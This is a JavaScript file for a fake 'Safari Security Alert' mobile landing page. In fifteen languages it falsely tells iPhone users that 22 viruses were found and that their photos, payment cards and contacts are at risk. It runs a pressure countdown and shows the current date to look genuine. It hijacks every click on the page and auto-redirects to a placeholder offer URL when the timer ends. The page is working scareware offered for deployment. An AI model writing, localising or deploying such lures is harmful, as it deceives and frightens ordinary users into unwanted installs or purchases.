const OFFER_URL = "{offer}";
const COUNTDOWN_SECONDS = 168;

const translations = {
  en: {
    title: "Safari Security Alert",
    brand: "Safari",
    heroTitle: "22 VIRUSES FOUND!",
    heroDanger: "DELETE ALL",
    heroCopy: "Your iPhone may be harboring viruses that could potentially harm your data, photos, payment cards and contacts if not addressed right away.",
    timerCopy: "Immediate action is required!",
    stepsTitle: "How to remove virus:",
    stepOneLabel: "Step 1.",
    stepOne: "Tap the button below & go to App Store to Install the recommended virus removal App for free.",
    stepTwoLabel: "Step 2.",
    stepTwo: "Run the app to remove all viruses.",
    cta: "Remove Viruses Now"
  },
  fr: {
  title: "Alerte de sécurité Safari",
  brand: "Safari",
  heroTitle: "22 VIRUS DÉTECTÉS !",
  heroDanger: "SUPPRIMEZ-LES TOUS",
  heroCopy: "Votre iPhone pourrait contenir des virus susceptibles d'endommager vos données, vos photos, vos cartes de paiement et vos contacts s'ils ne sont pas supprimés immédiatement.",
  timerCopy: "Une action immédiate est requise !",
  stepsTitle: "Comment supprimer les virus :",
  stepOneLabel: "Étape 1.",
  stepOne: "Appuyez sur le bouton ci-dessous et ouvrez l'App Store pour installer gratuitement l'application recommandée de suppression des virus.",
  stepTwoLabel: "Étape 2.",
  stepTwo: "Lancez l'application pour supprimer tous les virus.",
  cta: "Supprimer les virus maintenant"
},

"pt-PT": {
  title: "Alerta de Segurança do Safari",
  brand: "Safari",
  heroTitle: "22 VÍRUS ENCONTRADOS!",
  heroDanger: "ELIMINE TODOS",
  heroCopy: "O seu iPhone pode conter vírus que podem danificar os seus dados, fotografias, cartões de pagamento e contactos se não forem removidos imediatamente.",
  timerCopy: "É necessária uma ação imediata!",
  stepsTitle: "Como remover os vírus:",
  stepOneLabel: "Passo 1.",
  stepOne: "Toque no botão abaixo e aceda à App Store para instalar gratuitamente a aplicação recomendada para remoção de vírus.",
  stepTwoLabel: "Passo 2.",
  stepTwo: "Execute a aplicação para remover todos os vírus.",
  cta: "Remover vírus agora"
},

"pt-BR": {
  title: "Alerta de Segurança do Safari",
  brand: "Safari",
  heroTitle: "22 VÍRUS ENCONTRADOS!",
  heroDanger: "REMOVA TODOS",
  heroCopy: "Seu iPhone pode estar com vírus que podem comprometer seus dados, fotos, cartões de pagamento e contatos se não forem removidos imediatamente.",
  timerCopy: "É necessária uma ação imediata!",
  stepsTitle: "Como remover os vírus:",
  stepOneLabel: "Passo 1.",
  stepOne: "Toque no botão abaixo e acesse a App Store para instalar gratuitamente o aplicativo recomendado para remoção de vírus.",
  stepTwoLabel: "Passo 2.",
  stepTwo: "Execute o aplicativo para remover todos os vírus.",
  cta: "Remover vírus agora"
},

es: {
  title: "Alerta de seguridad de Safari",
  brand: "Safari",
  heroTitle: "¡SE HAN ENCONTRADO 22 VIRUS!",
  heroDanger: "ELIMÍNELOS TODOS",
  heroCopy: "Su iPhone podría contener virus que pueden dañar sus datos, fotos, tarjetas de pago y contactos si no se eliminan de inmediato.",
  timerCopy: "¡Se requiere una acción inmediata!",
  stepsTitle: "Cómo eliminar los virus:",
  stepOneLabel: "Paso 1.",
  stepOne: "Pulse el botón de abajo y vaya a la App Store para instalar gratis la aplicación recomendada para eliminar virus.",
  stepTwoLabel: "Paso 2.",
  stepTwo: "Abra la aplicación para eliminar todos los virus.",
  cta: "Eliminar virus ahora"
},

"es-419": {
  title: "Alerta de seguridad de Safari",
  brand: "Safari",
  heroTitle: "¡SE ENCONTRARON 22 VIRUS!",
  heroDanger: "ELIMÍNALOS TODOS",
  heroCopy: "Tu iPhone podría tener virus que pueden afectar tus datos, fotos, tarjetas de pago y contactos si no se eliminan de inmediato.",
  timerCopy: "¡Se requiere una acción inmediata!",
  stepsTitle: "Cómo eliminar los virus:",
  stepOneLabel: "Paso 1.",
  stepOne: "Toca el botón de abajo y abre la App Store para instalar gratis la aplicación recomendada para eliminar virus.",
  stepTwoLabel: "Paso 2.",
  stepTwo: "Abre la aplicación para eliminar todos los virus.",
  cta: "Eliminar virus ahora"
},

da: {
  title: "Safari-sikkerhedsadvarsel",
  brand: "Safari",
  heroTitle: "22 VIRUSSER FUNDET!",
  heroDanger: "FJERN DEM ALLE",
  heroCopy: "Din iPhone kan være inficeret med virus, som kan skade dine data, billeder, betalingskort og kontakter, hvis de ikke fjernes med det samme.",
  timerCopy: "Øjeblikkelig handling er påkrævet!",
  stepsTitle: "Sådan fjerner du virus:",
  stepOneLabel: "Trin 1.",
  stepOne: "Tryk på knappen nedenfor, og gå til App Store for gratis at installere den anbefalede app til fjernelse af virus.",
  stepTwoLabel: "Trin 2.",
  stepTwo: "Kør appen for at fjerne alle virus.",
  cta: "Fjern virus nu"
},

ja: {
  title: "Safariセキュリティ警告",
  brand: "Safari",
  heroTitle: "22個のウイルスを検出！",
  heroDanger: "すべて削除",
  heroCopy: "お使いのiPhoneには、データ、写真、支払いカード、連絡先に被害を及ぼす可能性のあるウイルスが存在する可能性があります。すぐに対処してください。",
  timerCopy: "直ちに対応が必要です！",
  stepsTitle: "ウイルスを削除する方法：",
  stepOneLabel: "手順 1.",
  stepOne: "下のボタンをタップし、App Storeで推奨のウイルス除去アプリを無料でインストールしてください。",
  stepTwoLabel: "手順 2.",
  stepTwo: "アプリを起動してすべてのウイルスを削除してください。",
  cta: "今すぐウイルスを削除"
},

fil: {
  title: "Babala sa Seguridad ng Safari",
  brand: "Safari",
  heroTitle: "22 VIRUS ANG NATAGPUAN!",
  heroDanger: "ALISIN ANG LAHAT",
  heroCopy: "Maaaring may mga virus ang iyong iPhone na maaaring makapinsala sa iyong data, mga larawan, payment card, at mga contact kung hindi agad maaaksyunan.",
  timerCopy: "Kailangang kumilos agad!",
  stepsTitle: "Paano alisin ang virus:",
  stepOneLabel: "Hakbang 1.",
  stepOne: "I-tap ang button sa ibaba at pumunta sa App Store upang libreng i-install ang inirerekomendang app para sa pagtanggal ng virus.",
  stepTwoLabel: "Hakbang 2.",
  stepTwo: "Patakbuhin ang app upang alisin ang lahat ng virus.",
  cta: "Alisin ang mga Virus Ngayon"
},

de: {
  title: "Safari-Sicherheitswarnung",
  brand: "Safari",
  heroTitle: "22 VIREN GEFUNDEN!",
  heroDanger: "ALLE ENTFERNEN",
  heroCopy: "Auf Ihrem iPhone befinden sich möglicherweise Viren, die Ihre Daten, Fotos, Zahlungskarten und Kontakte gefährden können, wenn sie nicht sofort entfernt werden.",
  timerCopy: "Sofortiges Handeln ist erforderlich!",
  stepsTitle: "So entfernen Sie Viren:",
  stepOneLabel: "Schritt 1.",
  stepOne: "Tippen Sie auf die Schaltfläche unten und öffnen Sie den App Store, um die empfohlene Virenschutz-App kostenlos zu installieren.",
  stepTwoLabel: "Schritt 2.",
  stepTwo: "Starten Sie die App, um alle Viren zu entfernen.",
  cta: "Viren jetzt entfernen"
},

nb: {
  title: "Safari-sikkerhetsvarsel",
  brand: "Safari",
  heroTitle: "22 VIRUS FUNNET!",
  heroDanger: "FJERN ALLE",
  heroCopy: "Din iPhone kan inneholde virus som kan skade dataene, bildene, betalingskortene og kontaktene dine hvis de ikke fjernes umiddelbart.",
  timerCopy: "Umiddelbar handling er nødvendig!",
  stepsTitle: "Slik fjerner du virus:",
  stepOneLabel: "Trinn 1.",
  stepOne: "Trykk på knappen nedenfor og gå til App Store for å installere den anbefalte virusfjerningsappen gratis.",
  stepTwoLabel: "Trinn 2.",
  stepTwo: "Kjør appen for å fjerne alle virus.",
  cta: "Fjern virus nå"
},

sv: {
  title: "Safari-säkerhetsvarning",
  brand: "Safari",
  heroTitle: "22 VIRUS HITTADE!",
  heroDanger: "TA BORT ALLA",
  heroCopy: "Din iPhone kan innehålla virus som kan skada dina data, foton, betalkort och kontakter om de inte tas bort omedelbart.",
  timerCopy: "Omedelbar åtgärd krävs!",
  stepsTitle: "Så tar du bort virus:",
  stepOneLabel: "Steg 1.",
  stepOne: "Tryck på knappen nedan och gå till App Store för att installera den rekommenderade virusborttagningsappen gratis.",
  stepTwoLabel: "Steg 2.",
  stepTwo: "Kör appen för att ta bort alla virus.",
  cta: "Ta bort virus nu"
},

it: {
  title: "Avviso di sicurezza Safari",
  brand: "Safari",
  heroTitle: "22 VIRUS TROVATI!",
  heroDanger: "ELIMINALI TUTTI",
  heroCopy: "Il tuo iPhone potrebbe contenere virus che potrebbero compromettere i tuoi dati, le foto, le carte di pagamento e i contatti se non vengono rimossi immediatamente.",
  timerCopy: "È richiesta un'azione immediata!",
  stepsTitle: "Come rimuovere i virus:",
  stepOneLabel: "Passaggio 1.",
  stepOne: "Tocca il pulsante qui sotto e vai su App Store per installare gratuitamente l'app consigliata per la rimozione dei virus.",
  stepTwoLabel: "Passaggio 2.",
  stepTwo: "Avvia l'app per rimuovere tutti i virus.",
  cta: "Rimuovi virus ora"
},

nl: {
  title: "Safari-beveiligingswaarschuwing",
  brand: "Safari",
  heroTitle: "22 VIRUSSEN GEVONDEN!",
  heroDanger: "VERWIJDER ZE ALLEMAAL",
  heroCopy: "Uw iPhone kan virussen bevatten die uw gegevens, foto's, betaalkaarten en contacten kunnen beschadigen als ze niet onmiddellijk worden verwijderd.",
  timerCopy: "Onmiddellijke actie is vereist!",
  stepsTitle: "Zo verwijdert u virussen:",
  stepOneLabel: "Stap 1.",
  stepOne: "Tik op de knop hieronder en ga naar de App Store om gratis de aanbevolen app voor virusverwijdering te installeren.",
  stepTwoLabel: "Stap 2.",
  stepTwo: "Start de app om alle virussen te verwijderen.",
  cta: "Virussen nu verwijderen"
},

ro: {
  title: "Alertă de securitate Safari",
  brand: "Safari",
  heroTitle: "22 DE VIRUȘI GĂSIȚI!",
  heroDanger: "ȘTERGEȚI-I PE TOȚI",
  heroCopy: "iPhone-ul dvs. poate conține viruși care vă pot afecta datele, fotografiile, cardurile de plată și contactele dacă nu sunt eliminați imediat.",
  timerCopy: "Este necesară o acțiune imediată!",
  stepsTitle: "Cum eliminați virușii:",
  stepOneLabel: "Pasul 1.",
  stepOne: "Atingeți butonul de mai jos și accesați App Store pentru a instala gratuit aplicația recomandată pentru eliminarea virușilor.",
  stepTwoLabel: "Pasul 2.",
  stepTwo: "Rulați aplicația pentru a elimina toți virușii.",
  cta: "Eliminați virușii acum"
}
};

const compactTextSizes = {
  default: {
    "--cta-min-height":"55px",
    "--alert__icon-with":"55px",
    "--topbar-min-height": "70px",
    "--topbar-padding": "15px 20px 15px",
    "--brand-font-size": "22px",
    "--date-font-size": "16px",
    "--title-font-size": "26px",
    "--copy-font-size": "14px",
    "--timer-font-size": "24px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "10px",
    "--cta-font-size": "17px"
  },
  min414: {
    "--brand-icon-width": "44px",
    "--brand-icon-height": "44px",
    "--brand-font-size": "23px",
    "--date-font-size": "19px",
    "--title-font-size": "26px",
    "--copy-font-size": "15px",
    "--timer-font-size": "26px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "21px"
  },
  max390: {
    "--alert__icon-with":"60px",
    "--brand-font-size": "24px",
    "--date-font-size": "17px",
    "--title-font-size": "26px",
    "--copy-font-size": "14px",
    "--timer-font-size": "26px",
    "--timer-copy-font-size": "14px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "16px"
  },
  max375: {
    "--brand-font-size": "18px",
    "--date-font-size": "16px",
    "--title-font-size": "24px",
    "--copy-font-size": "13px",
    "--timer-font-size": "20px",
    "--timer-copy-font-size": "11px",
    "--steps-title-font-size": "13px",
    "--steps-font-size": "10px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "14px",
    "--cta-min-height":"55px"
  },
  max320: {
    "--brand-font-size": "20px",
    "--date-font-size": "13px",
    "--title-font-size": "24px",
    "--copy-font-size": "14px",
    "--timer-font-size": "27px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "16px"
  }
};

const baseTextSizes = {
  default: {
    "--brand-font-size": "23px",
    "--date-font-size": "18px",
    "--title-font-size": "30px",
    "--copy-font-size": "16px",
    "--timer-font-size": "30px",
    "--timer-copy-font-size": "16px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "22px"
  },
  min414: {
    "--brand-font-size": "27px",
    "--date-font-size": "20px",
    "--title-font-size": "38px",
    "--copy-font-size": "18px",
    "--timer-font-size": "40px",
    "--timer-copy-font-size": "16px",
    "--steps-title-font-size": "18px",
    "--steps-font-size": "14px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "25px"
  },
  max390: {
    "--brand-font-size": "24px",
    "--date-font-size": "18px",
    "--title-font-size": "34px",
    "--copy-font-size": "15px",
    "--timer-font-size": "34px",
    "--timer-copy-font-size": "15px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "12px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "23px"
  },
  max375: {
    "--brand-font-size": "20px",
    "--date-font-size": "16px",
    "--title-font-size": "24px",
    "--copy-font-size": "13px",
    "--timer-font-size": "20px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "13px",
    "--steps-font-size": "10px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "18px"
  },
  max320: {
    "--brand-font-size": "21px",
    "--date-font-size": "14px",
    "--title-font-size": "30px",
    "--copy-font-size": "16px",
    "--timer-font-size": "32px",
    "--timer-copy-font-size": "15px",
    "--steps-title-font-size": "16px",
    "--steps-font-size": "15px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "18px"
  }
};

const localeTextSizes = {
  default: baseTextSizes,
  en: baseTextSizes,
  fr: compactTextSizes,
  "pt-PT": compactTextSizes,
  "pt-BR": compactTextSizes,
  es: compactTextSizes,
  "es-419": compactTextSizes,
  da: compactTextSizes,
  fil: compactTextSizes,
  de: compactTextSizes,
  nb: compactTextSizes,
  sv: compactTextSizes,
  it: compactTextSizes,
  nl: compactTextSizes,
  ro: compactTextSizes
};

function getRequestedLocale(supportedLocales) {
  const params = new URLSearchParams(window.location.search);
  const requestedLocale = params.get("lang") || params.get("locale");
  if (!requestedLocale) return null;

  const normalizedRequestedLocale = requestedLocale.toLowerCase();
  const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedRequestedLocale);
  if (exactLocale) return exactLocale;

  const baseLocale = normalizedRequestedLocale.split("-")[0];
  return supportedLocales.find((key) => key.toLowerCase() === baseLocale) || null;
}

function resolveLocale() {
  const supportedLocales = Object.keys(translations);
  const requestedLocale = getRequestedLocale(supportedLocales);
  if (requestedLocale) return requestedLocale;

  const browserLocales = Array.isArray(navigator.languages) && navigator.languages.length
    ? navigator.languages
    : [navigator.language || document.documentElement.lang || "en"];

  for (const candidate of browserLocales) {
    const normalizedCandidate = candidate.toLowerCase();
    const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedCandidate);
    if (exactLocale) return exactLocale;

    const baseLocale = normalizedCandidate.split("-")[0];
    const baseMatch = supportedLocales.find((key) => key.toLowerCase() === baseLocale);
    if (baseMatch) return baseMatch;
  }

  return "en";
}

const locale = resolveLocale();
const dictionary = translations[locale] || translations.en;
let remainingSeconds = COUNTDOWN_SECONDS;
let redirected = false;

function setViewportHeight() {
  const viewportHeight = window.visualViewport
    ? window.visualViewport.height
    : window.innerHeight;

  document.documentElement.style.setProperty(
    "--app-viewport-height",
    `${Math.round(viewportHeight)}px`
  );
}

function getTextSizeBreakpoint() {
  if (window.matchMedia("(max-width: 320px)").matches) return "max320";
  if (window.matchMedia("(max-width: 375px)").matches) return "max375";
  if (window.matchMedia("(max-width: 390px)").matches) return "max390";
  if (window.matchMedia("(min-width: 414px)").matches) return "min414";

  return "default";
}

function applyLocaleTextSizes() {
  const landing = document.querySelector(".landing");
  const sizeConfig = localeTextSizes[locale] || localeTextSizes.default;
  if (!landing || !sizeConfig) return;

  landing.dataset.locale = locale;

  const breakpoint = getTextSizeBreakpoint();
  const values = sizeConfig[breakpoint] || sizeConfig.default;

  Object.entries(values).forEach(([property, value]) => {
    landing.style.setProperty(property, value);
  });
}

function applyTranslations() {
  document.title = dictionary.title;

  document.querySelectorAll("[data-i18n]").forEach((node) => {
    const key = node.dataset.i18n;
    node.textContent = dictionary[key] || translations.en[key] || key;
  });
}

function setCurrentDate() {
  const dateNode = document.querySelector("[data-current-date]");
  if (!dateNode) return;

  const now = new Date();
  dateNode.dateTime = now.toISOString();
  dateNode.textContent = new Intl.DateTimeFormat(locale, {
    month: "long",
    day: "numeric"
  }).format(now);
}

function renderCountdown() {
  const timerNode = document.querySelector("[data-countdown]");
  if (!timerNode) return;

  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
  const seconds = String(remainingSeconds % 60).padStart(2, "0");
  timerNode.textContent = `00:${minutes}:${seconds}`;
}

function goToOffer() {
  if (redirected) return;
  redirected = true;
  window.location.href = OFFER_URL;
}

function startCountdown() {
  renderCountdown();

  const intervalId = window.setInterval(() => {
    remainingSeconds -= 1;
    renderCountdown();

    if (remainingSeconds <= 0) {
      window.clearInterval(intervalId);
      goToOffer();
    }
  }, 1000);
}

function bindClicks() {
  const offerLink = document.querySelector("[data-offer-link]");
  if (offerLink) {
    offerLink.href = OFFER_URL;
    offerLink.addEventListener("click", (event) => {
      event.preventDefault();
      goToOffer();
    });
  }

  document.addEventListener("click", (event) => {
    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
    if (isModifiedClick) return;

    event.preventDefault();
    goToOffer();
  });
}

applyLocaleTextSizes();
applyTranslations();
setViewportHeight();
setCurrentDate();
startCountdown();
bindClicks();

window.addEventListener("resize", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});
window.addEventListener("orientationchange", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", setViewportHeight);
  window.visualViewport.addEventListener("scroll", setViewportHeight);
}
